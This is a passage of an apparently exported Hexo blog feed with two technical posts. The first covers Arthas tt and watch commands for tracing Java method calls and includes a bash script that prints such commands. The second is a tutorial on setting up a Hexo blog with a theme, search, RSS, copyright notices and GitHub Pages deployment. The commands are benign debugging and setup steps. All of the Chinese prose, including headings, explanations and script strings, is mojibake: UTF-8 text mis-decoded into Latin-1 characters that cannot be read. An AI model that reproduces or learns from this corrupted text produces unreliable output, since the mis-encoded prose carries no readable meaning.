<p>2,ä½¿ç”¨tt -lå¯ä»¥æŸ¥çœ‹è®°å½•çš„åˆ—è¡¨ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tt -l</span><br></pre></td></tr></table></figure>
<p>3,ä½¿ç”¨tt -i indexæŸ¥çœ‹è°ƒç”¨ä¿¡æ¯ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tt -i [æ›¿æ¢ä¸ºINDEX]</span><br></pre></td></tr></table></figure>
<p>4,ä½¿ç”¨tt -i index -pé‡æ–°å‘èµ·ä¸€æ¬¡è¯·æ±‚ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tt -i [æ›¿æ¢ä¸ºINDEX] -p</span><br></pre></td></tr></table></figure>
<p>5ï¼Œttè·Ÿè¸ªçš„è®°å½•ï¼Œå¦‚æœéœ€è¦æ¸…é™¤ï¼Œå¯ä»¥ç›´æ¥shutdowné€€å‡ºarthaså‘½ä»¤</p>
<h4 id="shellå¿«é€Ÿæ“ä½œè„šæœ¬ç”Ÿæˆ"><a href="#shellå¿«é€Ÿæ“ä½œè„šæœ¬ç”Ÿæˆ" class="headerlink" title="shellå¿«é€Ÿæ“ä½œè„šæœ¬ç”Ÿæˆ"></a>shellå¿«é€Ÿæ“ä½œè„šæœ¬ç”Ÿæˆ</h4><p>è„šæœ¬åç§°ï¼šarthas.sh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#author: chenguolin</span></span><br><span class="line">p1=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$1</span>&quot;</span> = <span class="string">&quot;&quot;</span> ];<span class="keyword">then</span></span><br><span class="line">     <span class="built_in">echo</span>  <span class="string">&quot;è¯·ä¼ å…¥ï¼šæ–¹æ³•Referenceï¼å¦‚ï¼šsh arthas.sh com.test.UserService#query&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----------------------start--------------------------&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;#####################ç”Ÿæˆæ–¹æ³•ç›‘æµ‹å‘½ä»¤ttå’Œwatch##################&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;1,ä½¿ç”¨watchå‘½ä»¤è§‚å¯Ÿåˆ°æ–¹æ³•çš„å‚æ•°ã€è¿”å›å’Œå¼‚å¸¸æƒ…å†µï¼Œæ·±åº¦=3ã€æ¬¡æ•°=3ï¼š&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;watch &#x27;</span><span class="variable">$&#123;p1%#*&#125;</span><span class="string">&#x27; &#x27;</span><span class="variable">$&#123;p1##*#&#125;</span><span class="string">&#x27; &quot;&#123;params,returnObj,throwExp&#125;&quot; -x 3 -n 3&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;2,å°†è§‚å¯Ÿè®°å½•åˆ°æœ¬åœ°æ–‡ä»¶ä¸­ï¼š&#x27;</span></span><br><span class="line"><span class="built_in">echo</span>  <span class="string">&#x27;watch &#x27;</span><span class="variable">$&#123;p1%#*&#125;</span><span class="string">&#x27; &#x27;</span><span class="variable">$&#123;p1##*#&#125;</span><span class="string">&#x27; &quot;&#123;params,returnObj,throwExp&#125;&quot; -x 3 -n 10 &gt; /tmp/arthas/watch.log &amp;&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;3,åªè§‚å¯Ÿå¼‚å¸¸çš„è¯·æ±‚ï¼š&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;watch &#x27;</span><span class="variable">$&#123;p1%#*&#125;</span><span class="string">&#x27; &#x27;</span><span class="variable">$&#123;p1##*#&#125;</span><span class="string">&#x27; &quot;&#123;params,returnObj,throwExp&#125;&quot; -x 3 -n 3 -e&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;4,åªè§‚å¯Ÿå¤§äº200æ¯«ç§’çš„è¯·æ±‚ï¼š&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;watch &#x27;</span><span class="variable">$&#123;p1%#*&#125;</span><span class="string">&#x27; &#x27;</span><span class="variable">$&#123;p1##*#&#125;</span><span class="string">&#x27; &quot;&#123;params,returnObj,throwExp&#125;&quot; -x 3 -n 3 &quot;#cost&gt;200&quot;&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;5,è§‚å¯Ÿè¯·æ±‚æ–¹æ³•å¯¹è±¡ï¼Œä½¿ç”¨ç±»ä¼¼target.userå½¢å¼çš„å‘½ä»¤æŸ¥çœ‹å¯¹è±¡ï¼š&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;watch &#x27;</span><span class="variable">$&#123;p1%#*&#125;</span><span class="string">&#x27; &#x27;</span><span class="variable">$&#123;p1##*#&#125;</span><span class="string">&#x27; -n 3 &quot;target&quot;&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;6,ä½¿ç”¨ttå‘½ä»¤è®°å½•ä¸‹æ–¹æ³•çš„æ¯æ¬¡è°ƒç”¨ç¯å¢ƒç°åœºï¼Œæ¬¡æ•°=20ï¼š&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;tt -t -n 20 &#x27;</span><span class="variable">$&#123;p1%#*&#125;</span><span class="string">&#x27; &#x27;</span><span class="variable">$&#123;p1##*#&#125;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;7,ä½¿ç”¨tt -lå¯ä»¥æŸ¥çœ‹è®°å½•çš„åˆ—è¡¨ï¼š&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;tt -l&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;8,ä½¿ç”¨tt -i indexæŸ¥çœ‹è°ƒç”¨ä¿¡æ¯ï¼š&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;tt -i [æ›¿æ¢ä¸ºINDEX]&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;9,ä½¿ç”¨tt -i index -pé‡æ–°å‘èµ·ä¸€æ¬¡è¯·æ±‚ï¼š&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;tt -i [æ›¿æ¢ä¸ºINDEX] -p&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;10,ä½¿ç”¨tt -i index -w &#x27;</span>target<span class="string">&#x27;æŸ¥çœ‹å¯¹è±¡ä¿¡æ¯ï¼Œä¹Ÿä½¿ç”¨ç±»ä¼¼target.userå½¢å¼çš„å‘½ä»¤æŸ¥çœ‹å¯¹è±¡ï¼š&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;tt -i [æ›¿æ¢ä¸ºINDEX] -w &#x27;target&#x27;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----------------------end----------------------------&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨ç¤ºä¾‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh arthas.sh com.test.UserService<span class="comment">#query</span></span><br></pre></td></tr></table></figure>
<p>ç”Ÿæˆè„šæœ¬ç¤ºä¾‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----------------------start--------------------------</span><br><span class="line"></span><br><span class="line">#####################ç”Ÿæˆæ–¹æ³•ç›‘æµ‹å‘½ä»¤ttå’Œwatch##################</span><br><span class="line"></span><br><span class="line">1,ä½¿ç”¨watchå‘½ä»¤è§‚å¯Ÿåˆ°æ–¹æ³•çš„å‚æ•°ã€è¿”å›å’Œå¼‚å¸¸æƒ…å†µï¼Œæ·±åº¦&#x3D;3ã€æ¬¡æ•°&#x3D;3ï¼š</span><br><span class="line">watch com.test.UserService query &quot;&#123;params,returnObj,throwExp&#125;&quot; -x 3 -n 3</span><br><span class="line"></span><br><span class="line">2,å°†è§‚å¯Ÿè®°å½•åˆ°æœ¬åœ°æ–‡ä»¶ä¸­ï¼š</span><br><span class="line">watch com.test.UserService query &quot;&#123;params,returnObj,throwExp&#125;&quot; -x 3 -n 10 &gt; &#x2F;tmp&#x2F;arthas&#x2F;watch.log &amp;</span><br><span class="line"></span><br><span class="line">3,åªè§‚å¯Ÿå¼‚å¸¸çš„è¯·æ±‚ï¼š</span><br><span class="line">watch com.test.UserService query &quot;&#123;params,returnObj,throwExp&#125;&quot; -x 3 -n 3 -e</span><br><span class="line"></span><br><span class="line">4,åªè§‚å¯Ÿå¤§äº200æ¯«ç§’çš„è¯·æ±‚ï¼š</span><br><span class="line">watch com.test.UserService query &quot;&#123;params,returnObj,throwExp&#125;&quot; -x 3 -n 3 &quot;#cost&gt;200&quot;</span><br><span class="line"></span><br><span class="line">5,è§‚å¯Ÿè¯·æ±‚æ–¹æ³•å¯¹è±¡ï¼Œä½¿ç”¨ç±»ä¼¼target.userå½¢å¼çš„å‘½ä»¤æŸ¥çœ‹å¯¹è±¡ï¼š</span><br><span class="line">watch com.test.UserService query -n 3 &quot;target&quot;</span><br><span class="line"></span><br><span class="line">6,ä½¿ç”¨ttå‘½ä»¤è®°å½•ä¸‹æ–¹æ³•çš„æ¯æ¬¡è°ƒç”¨ç¯å¢ƒç°åœºï¼Œæ¬¡æ•°&#x3D;20ï¼š</span><br><span class="line">tt -t -n 20 com.test.UserService query</span><br><span class="line"></span><br><span class="line">7,ä½¿ç”¨tt -lå¯ä»¥æŸ¥çœ‹è®°å½•çš„åˆ—è¡¨ï¼š</span><br><span class="line">tt -l</span><br><span class="line"></span><br><span class="line">8,ä½¿ç”¨tt -i indexæŸ¥çœ‹è°ƒç”¨ä¿¡æ¯ï¼š</span><br><span class="line">tt -i [æ›¿æ¢ä¸ºINDEX]</span><br><span class="line"></span><br><span class="line">9,ä½¿ç”¨tt -i index -pé‡æ–°å‘èµ·ä¸€æ¬¡è¯·æ±‚ï¼š</span><br><span class="line">tt -i [æ›¿æ¢ä¸ºINDEX] -p</span><br><span class="line"></span><br><span class="line">10,ä½¿ç”¨tt -i index -w targetæŸ¥çœ‹å¯¹è±¡ä¿¡æ¯ï¼Œä¹Ÿä½¿ç”¨ç±»ä¼¼target.userå½¢å¼çš„å‘½ä»¤æŸ¥çœ‹å¯¹è±¡ï¼š</span><br><span class="line">tt -i [æ›¿æ¢ä¸ºINDEX] -w &#39;target&#39;</span><br><span class="line"></span><br><span class="line">----------------------end----------------------------</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>arthas</category>
      </categories>
      <tags>
        <tag>arthas</tag>
        <tag>watch</tag>
        <tag>tt</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexoåšå®¢æ­å»º</title>
    <url>/2020/06/14/blog-create-hexo/</url>
    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>Hexoæ˜¯åŸºäºNodejsçš„è½»é‡çº§åšå®¢ç³»ç»Ÿï¼Œä½¿ç”¨Markdownæ¥æ¸²æŸ“æ–‡ç« ï¼Œä½“ç§¯å°ã€å¿«é€Ÿã€ç®€æ´ã€å®‰è£…ç®€å•ã€‚</p>
<a id="more"></a>
<h4 id="æ­å»ºæ­¥éª¤"><a href="#æ­å»ºæ­¥éª¤" class="headerlink" title="æ­å»ºæ­¥éª¤"></a>æ­å»ºæ­¥éª¤</h4><p>å®‰è£…gitå’Œnodeå·¥å…·ï¼Œå‰ç½®å·¥ä½œï¼Œä¸åšè¯¦ç»†ä»‹ç»</p>
<h5 id="å®‰è£…yarn"><a href="#å®‰è£…yarn" class="headerlink" title="å®‰è£…yarn"></a>å®‰è£…yarn</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g yarn</span><br></pre></td></tr></table></figure>
<h5 id="å®‰è£…hexo"><a href="#å®‰è£…hexo" class="headerlink" title="å®‰è£…hexo"></a>å®‰è£…hexo</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn global add hexo</span><br></pre></td></tr></table></figure>
<h5 id="åˆå§‹åŒ–hexo"><a href="#åˆå§‹åŒ–hexo" class="headerlink" title="åˆå§‹åŒ–hexo"></a>åˆå§‹åŒ–hexo</h5><p>åˆ›å»ºä¸€ä¸ªç›®å½•ï¼Œä½œä¸ºåšå®¢çš„ç›®å½•ï¼Œå¹¶æ‰§è¡Œä»¥ä¸‹å‘½ä»¤è¿›è¡Œåˆå§‹åŒ–</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir hexo</span><br><span class="line"><span class="built_in">cd</span> hexo</span><br><span class="line">hexo init</span><br></pre></td></tr></table></figure>
<h5 id="å¯åŠ¨åšå®¢"><a href="#å¯åŠ¨åšå®¢" class="headerlink" title="å¯åŠ¨åšå®¢"></a>å¯åŠ¨åšå®¢</h5><p>æŸ¥çœ‹publicç›®å½•æ˜¯å¦å·²ç»ç”Ÿæˆï¼Œå¦‚æœæ²¡æœ‰ï¼Œæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ç”Ÿæˆï¼Œåç»­ä¿®æ”¹ä¸»é¢˜ã€é…ç½®ç­‰ï¼Œå¦‚æœé‡åˆ°æ‰¾ä¸åˆ°é¡µé¢çš„æƒ…å†µï¼Œå‡å¯ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤é‡æ–°ç”Ÿæˆã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br></pre></td></tr></table></figure>
<p>åå°æ¨¡å¼å¯åŠ¨</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo s &amp;</span><br></pre></td></tr></table></figure>
<p>debugæ¨¡å¼å¯åŠ¨</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo s --debug</span><br></pre></td></tr></table></figure>
<p>è®¿é—®ï¼š<a href="http://localhost:4000/">http://localhost:4000</a></p>
<h4 id="æ›´æ¢åšå®¢ä¸»é¢˜"><a href="#æ›´æ¢åšå®¢ä¸»é¢˜" class="headerlink" title="æ›´æ¢åšå®¢ä¸»é¢˜"></a>æ›´æ¢åšå®¢ä¸»é¢˜</h4><p>é»˜è®¤çš„åšå®¢ä¸»é¢˜å¯èƒ½å¹¶ä¸èƒ½æ‰“åŠ¨æˆ‘ä»¬ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦é€‰æ‹©ä¸€æ¬¾å–œæ¬¢çš„ä¸»é¢˜ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯maupassantä¸»é¢˜ã€‚</p>
<p>1ï¼Œè·å–ä¸»é¢˜ï¼Œåœ¨hexoç›®å½•ä¸‹æ‰§è¡Œ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/tufu9441/maupassant-hexo.git themes/maupassant</span><br></pre></td></tr></table></figure>
<p>2ï¼Œå®‰è£…ä¸»é¢˜ä¾èµ–</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-renderer-pug --save</span><br><span class="line">npm install hexo-renderer-sass --save</span><br></pre></td></tr></table></figure>
<p>3ï¼Œå¯ç”¨ä¸»é¢˜ï¼Œåªéœ€è¦ä¿®æ”¹ç«™ç‚¹é…ç½®æ–‡ä»¶_config.ymlå³å¯ï¼Œè®¾ç½®themeå‚æ•°</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">theme: maupassant</span><br></pre></td></tr></table></figure>

<h4 id="ç½‘ç«™å›¾æ ‡è®¾ç½®"><a href="#ç½‘ç«™å›¾æ ‡è®¾ç½®" class="headerlink" title="ç½‘ç«™å›¾æ ‡è®¾ç½®"></a>ç½‘ç«™å›¾æ ‡è®¾ç½®</h4><p>å°†favicon.icoæ”¾åœ¨Hexoæ ¹ç›®å½•çš„sourceæ–‡ä»¶å¤¹ä¸‹å³å¯ï¼Œå»ºè®®çš„å¤§å°ï¼š32px*32px</p>
<h4 id="è®¾ç½®æœç´¢åŠŸèƒ½"><a href="#è®¾ç½®æœç´¢åŠŸèƒ½" class="headerlink" title="è®¾ç½®æœç´¢åŠŸèƒ½"></a>è®¾ç½®æœç´¢åŠŸèƒ½</h4><p>1ï¼Œå®‰è£…æ’ä»¶</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure>
<p>2ï¼Œä¿®æ”¹ç«™ç‚¹é…ç½®ï¼Œä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œè®¾ç½®searchå‚æ•°</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  <span class="built_in">limit</span>: 10000</span><br></pre></td></tr></table></figure>
<p>3ï¼Œä¿®æ”¹ä¸»é¢˜é…ç½®ï¼Œå¼€å¯self_searchï¼Œå¹¶å…³é—­å…¶ä»–æœç´¢</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">self_search: <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h4 id="è®¾ç½®rssåŠŸèƒ½"><a href="#è®¾ç½®rssåŠŸèƒ½" class="headerlink" title="è®¾ç½®rssåŠŸèƒ½"></a>è®¾ç½®rssåŠŸèƒ½</h4><p>1ï¼Œå®‰è£…RSSæ’ä»¶</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-feed</span><br></pre></td></tr></table></figure>
<p>2ï¼Œä¿®æ”¹ç«™ç‚¹é…ç½®</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Extensions</span></span><br><span class="line">plugins:</span><br><span class="line">    hexo-generator-feed</span><br><span class="line"><span class="comment">#Feed Atom</span></span><br><span class="line">feed:</span><br><span class="line">    <span class="built_in">type</span>: atom</span><br><span class="line">    path: atom.xml</span><br><span class="line">    <span class="built_in">limit</span>: 20</span><br></pre></td></tr></table></figure>
<h4 id="åœ¨åº•éƒ¨æ·»åŠ å¤‡æ¡ˆä¿¡æ¯"><a href="#åœ¨åº•éƒ¨æ·»åŠ å¤‡æ¡ˆä¿¡æ¯" class="headerlink" title="åœ¨åº•éƒ¨æ·»åŠ å¤‡æ¡ˆä¿¡æ¯"></a>åœ¨åº•éƒ¨æ·»åŠ å¤‡æ¡ˆä¿¡æ¯</h4><p>è¿›å…¥ç›®å½•ï¼šhexo/themes/maupassant/layout/_partialï¼Œæ‰¾åˆ°æ–‡ä»¶ï¼šfooter.pugï¼Œæ·»åŠ å¦‚ä¸‹ä»£ç ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">|  éçˆ±é’å±±ç»¿æ°´ï¼ŒæƒŸå›¾éšè¿¹åŸ‹çŸ³ã€‚</span><br><span class="line">| å¤‡æ¡ˆä¿¡æ¯ï¼š</span><br><span class="line">a(rel=<span class="string">&#x27;nofollow&#x27;</span>, target=<span class="string">&#x27;_blank&#x27;</span>, href=<span class="string">&quot;http://www.miitbeian.gov.cn/&quot;</span>) æµ™-ICPå¤‡xxxxxå·</span><br></pre></td></tr></table></figure>

<h4 id="æ–‡ç« æ¨¡ç‰ˆè®¾ç½®"><a href="#æ–‡ç« æ¨¡ç‰ˆè®¾ç½®" class="headerlink" title="æ–‡ç« æ¨¡ç‰ˆè®¾ç½®"></a>æ–‡ç« æ¨¡ç‰ˆè®¾ç½®</h4><p>æ­£å¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä½¿ç”¨â€œhexo new æ–‡ç« åâ€å‘½ä»¤å°±èƒ½åˆ›å»ºä¸€ç¯‡æ–‡ç« ï¼Œè€Œä¸”ä¼šè‡ªåŠ¨ç»™æˆ‘ä»¬ç”Ÿæˆæ–‡ç« çš„front-matteræ¨¡ç‰ˆä¿¡æ¯ï¼Œä½†æ˜¯è¿™ä¸ªæ¨¡ç‰ˆå¯èƒ½ä¸ä¸€å®šé€‚ç”¨ï¼Œ<br>æ‰€ä»¥æˆ‘ä»¬æœ€å¥½æ˜¯åˆ›å»ºä¸€ä¸ªè‡ªå·±å¸¸ç”¨çš„æ¨¡ç‰ˆï¼Œè¿™æ ·ä¼šæ–¹ä¾¿å¾ˆå¤šã€‚</p>
<p>å¦‚ä½•è®¾ç½®æ¨¡ç‰ˆå‘¢ï¼Ÿåœ¨hexoæ ¹ç›®å½•ä¸‹ï¼Œæœ‰ä¸€ä¸ªâ€œscaffoldsâ€æ–‡ä»¶å¤¹ï¼Œé‡Œé¢æœ‰draft.md,page.md,post.md 3ä¸ªæ¨¡ç‰ˆæ–‡ä»¶ï¼Œæ–‡ç« å¯¹åº”çš„post.mdï¼Œæˆ‘ä»¬åªéœ€è¦æ›´æ”¹è¿™ä¸ªæ–‡ä»¶çš„å†…å®¹å³å¯ã€‚</p>
<p>æˆ‘ä»¬è®¾ç½®æ¨¡ç‰ˆå†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: &#123;&#123; title &#125;&#125; <span class="comment">#æ–‡ç« æ ‡é¢˜</span></span><br><span class="line">date: &#123;&#123; date &#125;&#125; <span class="comment">#æ–‡ç« æ—¶é—´</span></span><br><span class="line">toc: <span class="literal">true</span> <span class="comment">#æ˜¯å¦æ˜¾ç¤ºç›®å½•</span></span><br><span class="line">categories: <span class="comment">#æ–‡ç« åˆ†ç±»ï¼Œå¦‚æœæ˜¯å¤šä¸ªåˆ†ç±»ï¼Œå¿…é¡»ç”¨[]æ‹¬èµ·æ¥ï¼Œå¦åˆ™å°±ä¼šæˆä¸ºä¸Šä¸€ä¸ªåˆ†ç±»çš„å­ç±»</span></span><br><span class="line">     - [åˆ†ç±»åç§°]</span><br><span class="line">tags: <span class="comment">#æ–‡ç« æ ‡ç­¾</span></span><br><span class="line">     - æ ‡ç­¾åç§°</span><br><span class="line">description: æ‘˜è¦å†…å®¹ <span class="comment">#è‡ªå®šä¹‰æ˜¾ç¤ºçš„æ‘˜è¦ï¼Œæˆ–è€…ç›´æ¥åœ¨æ–‡ç« å†…å®¹ä¸­æ’å…¥&lt;!--more--&gt;ä»¥éšè—åé¢çš„å†…å®¹</span></span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<h4 id="æ–‡ç« ç‰ˆæƒä¿¡æ¯è®¾ç½®"><a href="#æ–‡ç« ç‰ˆæƒä¿¡æ¯è®¾ç½®" class="headerlink" title="æ–‡ç« ç‰ˆæƒä¿¡æ¯è®¾ç½®"></a>æ–‡ç« ç‰ˆæƒä¿¡æ¯è®¾ç½®</h4><p>æ–‡ç« éœ€è¦æ·»åŠ ç‰ˆæƒä¿¡æ¯ï¼Ÿå®‰æ’ï¼</p>
<p>1ï¼Œé¦–å…ˆåˆ°ä¸»é¢˜çš„_config.ymlæ–‡ä»¶ä¸­å¼€å¯ç‰ˆæƒé…ç½®</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">post_copyright:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span> </span><br><span class="line">  author: guolin </span><br></pre></td></tr></table></figure>
<p>2ï¼Œæ›¿æ¢ä¸»é¢˜ç‰ˆæƒé¡µé¢ä»£ç ï¼Œæ–‡ä»¶ä½ç½®ï¼šä¸»é¢˜/layout/_widget/copyright.pug</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">div</span><br><span class="line">  link(rel=<span class="string">&#x27;stylesheet&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;text/css&#x27;</span>, href=<span class="string">&#x27;/css/copyright.css&#x27;</span>)</span><br><span class="line">  ul.post-copyright</span><br><span class="line">    li.post-copyright-author</span><br><span class="line">    strong æœ¬æ–‡ä½œè€…ï¼š</span><br><span class="line">    = theme.post_copyright.author</span><br><span class="line">    li.post-copyright-link</span><br><span class="line">    strong æœ¬æ–‡é“¾æ¥ï¼š</span><br><span class="line">    a(href=<span class="string">&#x27;/&#x27;</span> + page.path)= page.permalink</span><br><span class="line">    li.post-copyright-license</span><br><span class="line">    strong ç‰ˆæƒå£°æ˜ï¼š</span><br><span class="line">    | æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ &lt;a href=<span class="string">&quot;http://creativecommons.org/licenses/by-nc-sa/3.0/cn/&quot;</span> rel=<span class="string">&quot;external nofollow&quot;</span> target=<span class="string">&quot;_blank&quot;</span>&gt;CC BY-NC-SA 3.0 CN&lt;/a&gt; è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼</span><br><span class="line">br</span><br></pre></td></tr></table></figure>
<p>3ï¼Œæ›¿æ¢ä¸»é¢˜ç‰ˆæƒé¡µé¢çš„æ ·å¼ï¼Œæ–‡ä»¶ä½ç½®ï¼šä¸»é¢˜/source/css/copyright.css</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.post-copyright</span> &#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">2em</span> <span class="number">0</span> <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0.5em</span> <span class="number">1em</span>;</span><br><span class="line">  <span class="attribute">border-left</span>: <span class="number">3px</span> solid <span class="number">#FF1700</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#F9F9F9</span>;</span><br><span class="line">  <span class="attribute">list-style</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.post-copyright</span>  <span class="selector-tag">li</span>&#123;<span class="attribute">margin</span>:<span class="number">8px</span> <span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="é…ç½®Githubæ‰˜ç®¡"><a href="#é…ç½®Githubæ‰˜ç®¡" class="headerlink" title="é…ç½®Githubæ‰˜ç®¡"></a>é…ç½®Githubæ‰˜ç®¡</h4><p>1ï¼Œåˆ°githubç«™ç‚¹ï¼Œåˆ›å»ºæ‰˜ç®¡ç«™ç‚¹çš„ä»“åº“</p>
<p>ç‚¹å‡»ï¼šnew repository</p>
<p>å¡«å†™ä»“åº“åä¸ºï¼šGithubç”¨æˆ·å.github.ioï¼Œè¿™é‡Œå¿…é¡»è¿™æ ·å¡«å†™ï¼Œå¦åˆ™æ— æ³•è®¿é—®ï¼Œæˆ‘è¿™é‡Œå¦‚ä¸‹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ln-guolin.github.io</span><br></pre></td></tr></table></figure>
<p>é€‰ä¸­ï¼šInitialize this repository with a README</p>
<p>2ï¼Œä¿®æ”¹ç«™ç‚¹é…ç½®ï¼Œå¢åŠ gitä¿¡æ¯</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">    <span class="built_in">type</span>: git</span><br><span class="line">    repo: https://github.com/Ln-guolin/Ln-guolin.github.io.git</span><br><span class="line">    branch: master</span><br></pre></td></tr></table></figure>
<p>3ï¼Œå®‰è£…gitæ’ä»¶</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-deployer-git</span><br></pre></td></tr></table></figure>
<p>4ï¼Œå‘å¸ƒç«™ç‚¹åˆ°githubï¼Œä¼šè®©ä½ è¾“å…¥githubè´¦å·å¯†ç </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo deploy</span><br></pre></td></tr></table></figure>
<p>å¥½äº†ï¼Œæˆªæ­¢æ­¤æ­¥éª¤ï¼Œå·²ç»å¯ä»¥é€šè¿‡â€œLn-guolin.github.ioâ€è®¿é—®è‡ªå·±çš„ç«™ç‚¹äº†</p>
<p>5ï¼Œæˆ‘ä»¬ç»§ç»­é…ç½®ï¼Œä½¿ç”¨è‡ªå·±çš„åŸŸåç»‘å®šåˆ°ç«™ç‚¹</p>
<p>æ ¹æ®è·¯å¾„:ç«™ç‚¹ä»“åº“ &gt;&gt; Settings &gt;&gt; GitHub Pages &gt;&gt; Custom domainï¼Œæ‰¾åˆ°custom domainï¼Œå¹¶å¡«å†™è‡ªå·±çš„åŸŸåã€‚</p>
